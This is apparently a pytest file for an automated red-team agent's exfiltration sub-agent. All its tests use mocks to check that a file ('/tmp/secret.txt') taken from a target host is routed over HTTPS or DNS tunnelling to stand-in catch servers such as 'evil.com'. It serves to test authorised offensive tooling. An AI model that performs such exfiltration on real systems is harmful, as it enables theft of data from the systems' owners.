"""Tests for the ExfilAgent sub-agent (Phase 4, Task 10).

Verifies that ``exfilagent_subagent`` dispatches to ``exfil_https`` or
``exfil_dns`` based on the ``method`` parameter and surfaces the
``ExfilResult`` as an ``ExfilEvidence`` record (with the
``catch_server_log_path`` operators check to confirm the transfer
landed).

Also verifies the ``method="dns"`` fallback: when ``domain`` is empty,
``catch_server`` is reused as the DNS tunnel domain (so the operator
can pass either one explicitly).
"""
from unittest.mock import AsyncMock, patch

import pytest

from autored.subagents.exfilagent import ExfilAgentOutput, exfilagent_subagent
from autored.tools.exfil import ExfilResult


@pytest.mark.asyncio
async def test_exfilagent_https_dispatches_to_exfil_https():
    """method="https" → exfil_https.ainvoke → ExfilEvidence records the
    catch_server + catch_server_log_path (Phase 5 traceability contract)."""
    fake_result = ExfilResult(
        method="https",
        source_host="10.10.10.5",
        data_size_bytes=0,
        catch_server="catch.example.com",
        catch_server_log_path="/var/log/catch/10.10.10.5.log",
        raw_output_path="/tmp/fake/exfil_https_cmd.out",
    )
    with patch("autored.subagents.exfilagent.exfil_https") as mock_https, \
         patch("autored.subagents.exfilagent.exfil_dns") as mock_dns:
        mock_https.ainvoke = AsyncMock(return_value=fake_result)
        mock_dns.ainvoke = AsyncMock()  # should never be called
        result = await exfilagent_subagent.ainvoke({
            "host_ip": "10.10.10.5",
            "file_path": "/tmp/secret.txt",
            "catch_server": "catch.example.com",
            "method": "https",
            "engagement_id": "test-eng",
        })
    assert isinstance(result, ExfilAgentOutput)
    assert result.host_ip == "10.10.10.5"
    assert result.method == "https"
    assert result.evidence is not None
    assert result.evidence.method == "https"
    assert result.evidence.source_host == "10.10.10.5"
    assert result.evidence.catch_server == "catch.example.com"
    assert result.evidence.catch_server_log_path == "/var/log/catch/10.10.10.5.log"
    mock_https.ainvoke.assert_awaited_once()
    mock_dns.ainvoke.assert_not_awaited()


@pytest.mark.asyncio
async def test_exfilagent_dns_dispatches_to_exfil_dns():
    """method="dns" → exfil_dns.ainvoke with the DNS tunnel domain."""
    fake_result = ExfilResult(
        method="dns",
        source_host="10.10.10.5",
        data_size_bytes=0,
        catch_server="evil.com",
        catch_server_log_path="/var/log/catch/10.10.10.5.log",
        raw_output_path="/tmp/fake/exfil_dns_cmd.out",
    )
    with patch("autored.subagents.exfilagent.exfil_https") as mock_https, \
         patch("autored.subagents.exfilagent.exfil_dns") as mock_dns:
        mock_dns.ainvoke = AsyncMock(return_value=fake_result)
        mock_https.ainvoke = AsyncMock()  # should never be called
        result = await exfilagent_subagent.ainvoke({
            "host_ip": "10.10.10.5",
            "file_path": "/tmp/secret.txt",
            "catch_server": "evil.com",
            "method": "dns",
            "engagement_id": "test-eng",
        })
    assert isinstance(result, ExfilAgentOutput)
    assert result.method == "dns"
    assert result.evidence is not None
    assert result.evidence.method == "dns"
    assert result.evidence.catch_server == "evil.com"
    mock_dns.ainvoke.assert_awaited_once()
    mock_https.ainvoke.assert_not_awaited()


@pytest.mark.asyncio
async def test_exfilagent_dns_falls_back_to_catch_server_when_domain_empty():
    """When method="dns" and ``domain`` is empty, ``catch_server`` is
    reused as the DNS tunnel domain. Operators can pass either field
    explicitly."""
    fake_result = ExfilResult(
        method="dns",
        source_host="10.10.10.5",
        data_size_bytes=0,
        catch_server="evil.com",
        catch_server_log_path="/var/log/catch/10.10.10.5.log",
    )
    captured = {}

    async def fake_ainvoke(payload):
        captured.update(payload)
        return fake_result

    with patch("autored.subagents.exfilagent.exfil_dns") as mock_dns:
        mock_dns.ainvoke = fake_ainvoke
        result = await exfilagent_subagent.ainvoke({
            "host_ip": "10.10.10.5",
            "file_path": "/tmp/secret.txt",
            "catch_server": "evil.com",
            "method": "dns",
            "engagement_id": "test-eng",
            # domain intentionally omitted
        })
    assert captured["domain"] == "evil.com"
    assert captured["file_path"] == "/tmp/secret.txt"
    assert captured["host_ip"] == "10.10.10.5"
    assert result.method == "dns"


@pytest.mark.asyncio
async def test_exfilagent_default_method_is_https():
    """When ``method`` is omitted, the default is HTTPS (the faster,
    larger-file method). Mirrors the brief's parameter default."""
    fake_result = ExfilResult(
        method="https",
        source_host="10.10.10.5",
        data_size_bytes=0,
        catch_server="catch.example.com",
        catch_server_log_path="/var/log/catch/10.10.10.5.log",
    )
    with patch("autored.subagents.exfilagent.exfil_https") as mock_https, \
         patch("autored.subagents.exfilagent.exfil_dns") as mock_dns:
        mock_https.ainvoke = AsyncMock(return_value=fake_result)
        mock_dns.ainvoke = AsyncMock()
        result = await exfilagent_subagent.ainvoke({
            "host_ip": "10.10.10.5",
            "file_path": "/tmp/secret.txt",
            "catch_server": "catch.example.com",
            "engagement_id": "test-eng",
            # method intentionally omitted
        })
    assert result.method == "https"
    mock_https.ainvoke.assert_awaited_once()
    mock_dns.ainvoke.assert_not_awaited()
